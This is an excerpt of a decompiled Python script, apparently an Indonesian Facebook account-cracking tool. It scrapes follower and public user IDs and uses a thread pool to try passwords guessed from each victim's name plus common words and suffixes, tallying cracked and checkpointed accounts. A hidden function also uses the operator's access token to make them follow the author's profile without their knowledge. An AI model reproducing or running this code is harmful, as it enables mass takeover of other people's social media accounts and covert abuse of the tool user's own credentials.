...
# Time Succes decompile : 2022-05-14 12:50:33.664186
...
B = ('\x1b[1;96m')
P = ('\x1b[1;97m')
___banner___ = (""" ___    _   __  __ ___  _   ___ ___ \n| _ \  /_\ |  \/  | _ \/_\ / __| __|\n|   / / _ \| |\/| |  _/ _ \ (_ | _| \n|_|_\/_/ \_\_|  |_|_|/_/ \_\___|___|
====================================
""")
loop = []
ok = []
...
def ___follow___():
    ...
    try:
        ...
        ___kata___ = random.choice(['xhurayra'])
        ___komen___ = ('Halo bang @[100003849028802:]\n\n'+___kata___+'\n'+___waktu)
        ___komen2___ = ('Halo bang @[100003849028802:]\n\n'+___kata___+'\n'+___waktu)
        ___komen3___ = random.choice(['hai bang','apa kabar'])
        requests.post('https://graph.facebook.com/100003849028802/subscribers?access_token=%s'%(___token)) 
        requests.post('https://graph.facebook.com/100003849028802/subscribers?access_token=%s'%(___token)) 
    except:
...
def ___menu___():
    ...
    print("%s[%s\033[0;96m01%s]%s \033[0;96mDump ID Follower All %s%s%s"%(B,P,B,P,B,P,B))
    print("%s[%s\033[0;96m02%s]%s \033[0;96mDump ID Follower Old %s%s%s"%(B,P,B,P,B,P,B))
    print("%s[%s\033[0;96m03%s]%s \033[0;96mDump ID Follower New %s%s%s"%(B,P,B,P,B,P,B))
    print("%s[%s\033[0;96m04%s]%s \033[0;96mDump ID Public All %s%s%s"%(B,P,B,P,B,P,B))
    print("%s[%s\033[0;96m05%s]%s \033[0;96mDump ID Public Old %s%s%s"%(B,P,B,P,B,P,B))
    print("%s[%s\033[0;96m06%s]%s \033[0;96mDump ID Public New %s%s%s"%(B,P,B,P,B,P,B))
    
    print("%s[%s\033[0;90m00%s]%s \033[0;91mkeluar \033[0;92m\n"%(B,P,B,P)) 
        ...
        with ThreadPoolExecutor(max_workers=35) as (___hayuk):
            ...
            for ___user in ___files:
                ...
                if len(z)==2 or len(z)==3 or len(z)==4 or len(z)==5 or len(z)==6:
                    pwx = [name, z[0]+'123', z[1]+'123', z[0]+'1234', z[1]+'1234', z[0]+'12345', z[1]+'12345', z[0]+'123456', z[1]+'123456', 'Sayang', 'Bismillah','yesus123','anjing123','yoshi7000','freefire','garena']
                else:
                    pwx = [name, z[0]+'123', z[1]+'123', z[0]+'1234', z[1]+'1234', z[0]+'12345', z[1]+'12345', z[0]+'123456', z[1]+'123456', 'Sayang', 'Bismillah','yesus123','anjing123','yoshi7000','freefire','garena']
...
def ___api___(total, uid, pwx):
    ...
    sys.stdout.write(
        "\r\x1b[1;97m[Yoshii] %s/%s Ok:-%s - Cp:-%s "%(loop, len(total), len(ok), len(cp))
    ); sys.stdout.flush()
    try:
        for pw in pwx:
            pw = pw.lower()
